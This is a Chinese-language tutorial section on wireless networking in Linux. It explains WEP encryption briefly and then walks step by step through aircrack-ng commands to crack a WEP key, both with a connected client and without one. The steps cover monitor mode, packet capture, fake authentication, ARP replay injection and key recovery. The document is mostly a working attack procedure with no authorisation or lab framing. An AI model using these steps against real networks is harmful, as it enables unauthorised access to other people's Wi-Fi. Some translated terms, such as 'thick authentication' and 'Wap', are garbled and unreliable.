    \n## 第 10 部分：Linux 中的无线网络\n![](img/image-fccpn63h.jpg) ![](img/image-z1ycxjwl.jpg)\
    \ 接入点（Access Point）是传输信号的设备。无线适配器是连接到接入点的设备。SSID 是无线网络的名称。通道（Channel）是代表特定无线通信频率的数字，加密是使用\
    \ Wap – WEP – WPA2 对消息进行编码的过程。它分为两个步骤：身份验证和加密![](img/image-vjowx1co.jpg)\n\n![](img/image-ehjo73t9.jpg)\
    \ ![](img/image-4qy4ougg.jpg) WEP 身份验证有 64 位、128 位和 256 位。你输入预共享密钥。接入点生成 IV（初始化向量），它是一个\
    \ 24 位的密钥。WEP 种子进入 `RC4 Cipher` 算法，然后进入密钥流（keystream），接着进入 `CRC-32` 进行错误修正和检测。它获取数据和\
    \ ICV。对数据和密钥流进行异或（XOR）操作![](img/image-joxefsxr.jpg)\n\n要检查无线卡是否支持注入（injection），使用\
    \ `airmon-ng` 或 `iwconfig` 命令![](img/image-h4na1f37.jpg) 你需要知道 是否能看到网络\n`#airmon-ng`\
    \ 或 `#iwconfig` \n\n要激活监听模式，输入：\n```bash\nairmon-ng start wlan1\n```\n（网卡）![](img/image-yiu4vzod.jpg)\
    \ 查看我周围的无线网络：\n```bash\nairodump-ng mon0\n```\n停止监听模式：\n```bash\nairmon-ng stop\
    \ mon0\nairmon-ng stop wlan1\n```\n\n在我们想要访问的接入点上激活监听模式：\n```bash\nairmon-ng start\
    \ wlan1 6\n```\n（接入点通道数）检查接入点是否支持注入功能：\n```bash\naireplay-ng -9 -e demo -a (mac\
    \ address) mon0\n```\n（或 --test）它必须显示注入正在工作![](img/image-rjy1zzm7.jpg) Aircrack\
    \ 是破解已连接客户端 WEP 的最佳工具。它监控无线网络上的数据包以获取 IV，从 IV 中获取密码：\n```bash\niwconfig\nairmon-ng\
    \ start wlan1\n```\n![](img/image-ca323so.jpg) 查看我周围所有的网络：\n```bash\nairodump-ng\
    \ mon1\n```\n它将列出你周围所有的网络 ![](img/image-c4h795pf.jpg)\n```bash\nairodump-ng -c\
    \ 2 (ch no) -b bssid -w www mon1\n```\n捕获的数据包将保存在 `www` 中。对于强认证（thick authentication）：\n\
    ```bash\naireplay-ng -1 -0 -e demo -a (mac address of access point) -h (mac address\
    \ of the client I want to crack the packet) mon1\n```\n![](img/image-a8fx55et.jpg)\
    \ 发送 ARP 请求以加速捕捉：\n```bash\naireplay-ng -3 -b bssid h (mac address of the client\
    \ I want to crack the packet) mon1\n```\n![](img/image-beb55ayx.jpg) 20000 个数据包后，打开新窗口并输入：\n\
    ```bash\naircrack-ng -b bssid ww*.cap\n```\n然后你就能找到无线密码。通过网络中的一个客户端，你可以找到 WEP\
    \ 身份验证![](img/image-3xbl07px.jpg) ![](img/image-e4gt7k.jpg) ![](img/image-y19hig0.jpg)\n\
    \n在没有客户端连接接入点的情况下找到 WEP 身份验证密码，我们需要另一种技术。它将使用我设备的监听模式，而不是使用接入点的客户端 MAC 地址。进入 Linux\
    \ 并输入：\n```bash\niwconfig\n```\n![](img/image-s2ru9vm.jpg) 激活监听模式：\n```bash\n\
    airmon-ng start wlan1\n```\n![](img/image-sfyr2ghc.jpg) 查看我周围的网络：\n```bash\nairodump-ng\
    \ mon0\n```\n![](img/-stw36om8.jpg) `mon0` 将创建一个虚拟适配器网络。要查看监听模式虚拟适配器网络的 MAC 地址：\n\
    ```bash\nifconfig\n```\n![](img/image-7y4klzek.jpg) 捕捉数据包：\n```bash\nairodump-ng\
    \ -c 3 (ch no) -b bssid -w eee mon0\n```\n![](img/image-hhc07uw6.jpg) 执行强认证：\n\
    ```bash\naireplay-ng -1 -0 -e demo -a (mac address of access point) -h (mac address\
    \ of monitoring mode) mon0\n```\n![](img/image-6hf7ur.jpg) 发送 ARP 请求以加速数据包捕捉：\n\
    ```bash\naireplay-ng -3 -b (mac address of access point) -h (mac address of monitoring\
    \ mode) mon0\n```\n![](img/image-wra54et.jpg) 等待 20000 个数据包。打开新窗口并输入：\n```bash\n\
    aircrack-ng -b bssid ee*.cap\n```\n然后你就能找到无线密码。所以从网络中的一个客户端，你可以找到 WEP 身份验证![](img/image-vrntesv6.jpg)\
